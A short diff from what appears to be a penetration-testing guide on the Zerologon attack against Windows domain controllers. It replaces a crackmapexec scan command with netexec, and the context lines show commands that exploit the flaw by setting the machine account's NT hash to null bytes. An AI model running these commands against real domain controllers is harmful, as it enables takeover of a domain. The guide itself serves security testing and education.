@@ -57,7 +57,7 @@ The original attack path can be conducted from UNIX-like systems with the follow
 ```bash
 # Scan for the vulnerability
 zerologon-scan 'DC_name' 'DC_IP_address'
-crackmapexec smb $DC_IP_address -u '' -p '' -M zerologon
+netexec smb $DC_IP_address -u '' -p '' -M zerologon
 
 # Exploit the vulnerability: set the NT hash to \x00*8
 zerologon-exploit 'DC_name' 'DC_IP_address'
